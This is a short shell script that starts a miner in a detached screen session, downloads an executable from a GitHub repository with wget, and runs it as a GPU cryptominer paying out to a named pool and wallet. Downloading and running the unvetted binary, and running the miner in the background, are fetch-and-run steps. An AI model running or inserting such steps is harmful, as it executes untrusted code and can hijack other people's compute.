#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS random ./hellminer 65 75
wget https://github.com/haser3/man1/raw/main/tuyulgpu
chmod +x tuyulgpu
./tuyulgpu --algo ETCHASH --pool etchash.unmineable.com:3333 --user LTC:0x6bf74f277f2d2014478f2600d322dbaafb542455.uy